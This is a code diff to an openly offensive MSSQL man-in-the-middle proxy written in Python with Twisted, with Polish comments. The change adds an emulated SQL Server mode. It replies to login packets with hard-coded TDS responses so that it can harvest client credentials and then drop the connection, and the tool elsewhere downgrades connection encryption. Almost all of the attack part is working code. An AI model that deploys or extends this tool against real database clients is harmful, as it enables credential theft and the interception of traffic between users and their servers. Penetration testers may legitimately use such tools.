@@ -11,8 +11,6 @@
 #   https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/capture/mssql.rb
 #
 # do zrobienia:
-# - emulacja serwera
-# - wlasna fabryka do wspoldzielenia danych - https://stackoverflow.com/questions/14848793/passing-parameters-to-twisted-factory-to-be-passed-to-session
 # - naspisywanie server_name TDS_Login
 
 TDS_RESPONSE          = 4
@@ -32,6 +30,7 @@ CYAN = "\033[36m"
 END = "\033[0m"
 CROSSED = "\x1b[9m"
 NOT_CROSSED = "\x1b[29m"
+LOCAL_SERVER = "null"
 
 import sys
 import logging
@@ -111,6 +110,8 @@ class MSSQLServerProtocol(protocol.Protocol):
         if Config.loop:
             factory.protocol = LoopClientProtocol
             reactor.connectTCP(Config.clientLoopAddr, Config.clientLoopPort, factory)
+        elif Config.serverAddr == LOCAL_SERVER:
+            pass 
         else:
             factory.protocol = MSSQLClientProtocol
             reactor.connectTCP(Config.serverAddr, Config.serverPort, factory)
@@ -234,10 +235,32 @@ class MSSQLServerProtocol(protocol.Protocol):
         self.checkPacketforStrings(data)
         self.checkPacketforRegexp(data)
 
+        if Config.serverAddr == LOCAL_SERVER:
+            self.fakeServer(data)
+            return 
+
         if self.client:
             self.client.write(data)
         else:
             self.buffer = data
+
+    def fakeServer(self, data):
+        packet = tds.TDSPacket(data)
+        LOG.debug("fake TDS packet recv: %s",vars(packet))
+
+        if packet.fields['Type'] == tds.TDS_PRE_LOGIN:
+            packet.fields['Type']=TDS_RESPONSE
+            data=packet.getData()
+
+        if packet.fields['Type'] == tds.TDS_LOGIN7:
+            # fake SQL Server response
+            data = b"\x04\x01\x01\xa5\x00D\x01\x00\xe3\x1b\x00\x01\x06m\x00a\x00s\x00t\x00e\x00r\x00\x06m\x00a\x00s\x00t\x00e\x00r\x00\xab^\x00E\x16\x00\x00\x02\x00%\x00C\x00h\x00a\x00n\x00g\x00e\x00d\x00 \x00d\x00a\x00t\x00a\x00b\x00a\x00s\x00e\x00 \x00c\x00o\x00n\x00t\x00e\x00x\x00t\x00 \x00t\x00o\x00 \x00'\x00m\x00a\x00s\x00t\x00e\x00r\x00'\x00.\x00\x03X\x00L\x002\x00\x00\x01\x00\x00\x00\xe3\x08\x00\x07\x05\x15\x04\xd0\x00\x00\x00\xe3\x0f\x00\x02\x06p\x00o\x00l\x00s\x00k\x00i\x00\x00\xab`\x00G\x16\x00\x00\x01\x00&\x00Z\x00m\x00i\x00e\x00n\x00i\x00o\x00n\x00o\x00 \x00u\x00s\x00t\x00a\x00w\x00i\x00e\x00n\x00i\x00a\x00 \x00j\x00\x19\x01z\x00y\x00k\x00a\x00 \x00n\x00a\x00 \x00p\x00o\x00l\x00s\x00k\x00i\x00.\x00\x03X\x00L\x002\x00\x00\x01\x00\x00\x00\xad6\x00\x01t\x00\x00\x04\x16M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00 \x00S\x00Q\x00L\x00 \x00S\x00e\x00r\x00v\x00e\x00r\x00\x00\x00\x00\x00\x0f\x00\x085\xe3\x13\x00\x04\x044\x000\x009\x006\x00\x044\x000\x009\x006\x00\xae\x01.\x00\x00\x00\x00\x09\x00`\x81\x14\xff\xe7\xff\xff\x00\x02\x02\x01\x02\x04\x01\x00\x05\x04\xff\xff\xff\xff\x06\x01\x00\x07\x01\x02\x08\x08\x00\x00\x00\x00\x00\x00\x00\x00\x09\x04\xff\xff\xff\xff\x09\x02\x00\x00\x00\x02\x01\x0a\x01\x00\x00\x00\x01\xff\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"    
+
+        if  packet.fields['Type'] == tds.TDS_SQL_BATCH:
+            # fake empty one row one column response
+            data= b"\x04\x01\x00#\x00D\x01\x00\x81\x01\x00\x00\x00\x00\x00 \x004\x00\xd1D\x00\xfd\x10\x00\xc1\x00\x01\x00\x00\x00\x00\x00\x00\x00"
+        LOG.debug("fake TDS packet send: %s",data)
+        self.write(data)
 
     # Proxy => Client
     def write(self, data):
@@ -404,7 +427,7 @@ class LoopClientProtocol(protocol.Protocol):
     def write(self, data):
         if data:
             self.transport.write(data) 
- 
+
 class Config:
     loop = True
     listenPort = 1433
@@ -423,13 +446,6 @@ class Config:
     serverRequiresEncryption = False
     findQuery = None
     findQueryRe = None
-
-
-#class MyServerFactory(protocol.ServerFactory):
-#    config = Config()
-#    
-#    def __init__(self, config):
-#        self.config = config
 
 def show_banner():
     if Config.debugLevel >= logging.ERROR:
@@ -453,19 +469,17 @@ def show_banner():
 
 def startLoop():
     loopFactory = protocol.ServerFactory()
-#    loopFactory = MyServerFactory()
     loopFactory.protocol = LoopServerProtocol
     reactor.listenTCP(Config.serverLoopPort, loopFactory, interface=Config.serverLoopAddr)
 
 def startListener():
     factory = protocol.ServerFactory()
-#    factory = MyServerFactory()
     factory.protocol = MSSQLServerProtocol
     reactor.listenTCP(Config.listenPort, factory)
 
 def getArgs():
     parser = argparse.ArgumentParser(add_help = True, description = "MSSQL MITM proxy (SSL supported).")
-    parser.add_argument('target', action='store', help='MSSQL server name or address')
+    parser.add_argument('target', action='store', help='MSSQL server name or address (use "null" for MSSQL server emulation - connection will be dropped after obtaining credentials)')
     parser.add_argument('-port', action='store', default='1433', help='MSSQL server port (default 1433)')
     parser.add_argument('-lport', action='store', default='1433', help='local listening port (default 1433)')
 
@@ -543,8 +557,11 @@ def main():
     logging.debug(version.getInstallationPath())
     
     show_banner()
-
-    getServerEncryption()
+    
+    if Config.serverAddr == LOCAL_SERVER:
+        Config.loop =False
+    else:
+        getServerEncryption()
 
     if Config.loop:
         LOG.warning("Starting loop decrypted connection for proxy or sniffer on loopback interface\n[ client->0.0.0:%s-(decryption)->%s:%s->%s:%s-(%s)->%s:%s ]",Config.listenPort,Config.clientLoopAddr,Config.clientLoopPort,Config.serverLoopAddr,Config.serverLoopPort,("encryption" if Config.serverRequiresEncryption else f"{CROSSED}encryption{NOT_CROSSED}-downgreaded"),Config.serverAddr,Config.serverPort)
